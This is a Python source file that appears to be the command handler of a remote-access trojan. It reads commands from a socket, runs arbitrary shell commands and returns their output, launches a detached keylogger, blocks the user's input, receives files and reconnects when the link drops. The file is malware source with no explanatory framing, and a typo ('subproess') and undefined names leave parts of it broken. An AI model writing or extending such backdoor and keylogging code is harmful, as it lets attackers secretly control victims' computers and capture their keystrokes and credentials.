#! /usr/bin/env python
from incomingFile import incomingFile
import subprocess
import sys

def runShell(socketHolder):
	data = socketHolder.recv(1024)
	if data:
		if data == "SENDFILE":
			incomingFile(data, socketHolder)
		elif data == "exit":
			socketHolder.send('exit')
			socketHolder.close()
			sys.exit(0)
		elif data == "logKeysOn":
			# Execute an external program without waiting for it to finish
			CREATE_NEW_PROCESS_GROUP = 0x00000200
			DETACHED_PROCESS = 0x00000008
			pid = subprocess.Popen([sys.executable, "logKeys.py"],
				creationflags=DETACHED_PROCESS).pid
			socketHolder.send('Logger started')
		elif data == 'blockInput':
			CREATE_NEW_PROCESS_GROUP = 0x00000200
			DETACHED_PROCESS = 0x00000008
			pid = subproess.Popen([sys.executable, "blockInput.py"],
				creationflags=DETACHED_PROCESS).pid
			socketHolder.send('Block Input started')
		elif len(data) == 0:
			return True
		else:
			proc = subprocess.Popen(data, shell=True,
				stdout=subprocess.PIPE, stderr=subprocess.PIPE,
				stdin=subprocess.PIPE)
			stdout_value = proc.stdout.read() + proc.stderr.read()
			socketHolder.send(stdout_value)
			return False
	else:
		print 'Lost connection to host. Will attempt to reconnect.'
		socketHolder = connect((HOST,PORT))